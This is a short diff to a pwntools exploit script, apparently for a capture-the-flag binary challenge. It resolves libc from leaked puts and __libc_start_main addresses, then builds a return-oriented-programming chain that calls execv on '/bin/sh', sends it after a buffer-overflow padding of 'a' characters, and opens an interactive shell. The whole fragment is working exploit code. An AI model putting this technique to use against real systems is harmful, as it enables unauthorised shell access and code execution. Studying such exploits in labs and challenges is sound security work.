@@ -68,8 +68,8 @@ print("puts: 0x%x" % puts)
 lib = libc_resolve({"__libc_start_main": libc_start_main, "puts": puts}, choice=0)
 
 io.recvuntil("to?\n")
-rop = ROP(exe)
-rop.call(lib.symbols["execv"], [next(lib.search("/bin/sh\0")) , 0])
+rop = ROP(lib)
+rop.execv(next(lib.search("/bin/sh\0")) , 0)
 io.sendline("a" * offset + rop.chain())
 io.interactive()
 ```
